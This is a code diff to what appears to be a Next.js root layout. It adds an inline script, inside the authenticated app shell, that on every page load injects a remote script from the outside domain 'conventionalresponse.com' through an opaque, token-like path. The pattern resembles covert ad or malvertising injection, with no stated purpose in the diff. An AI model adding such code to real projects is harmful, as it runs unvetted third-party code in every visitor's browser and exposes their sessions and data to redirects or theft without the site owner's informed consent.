@@ -68,6 +68,20 @@ export default function RootLayout({
                 <AuthProvider>
                     <Navbar />
                     <main>{children}</main>
+                    <script
+                        dangerouslySetInnerHTML={{
+                            __html: `(function(cfvz){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = cfvz || {};
+s.src = "//conventionalresponse.com/b.XcVmsAdjGLln0/YoWQcJ/beamJ9lu/ZqU-lvkQPxToYc4/NszeMkxsNOTgcytKNPjcgO3MMjzdEO2RMjQF";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})`,
+                        }}
+                    />
                     <Footer />
                 </AuthProvider>
                 <script
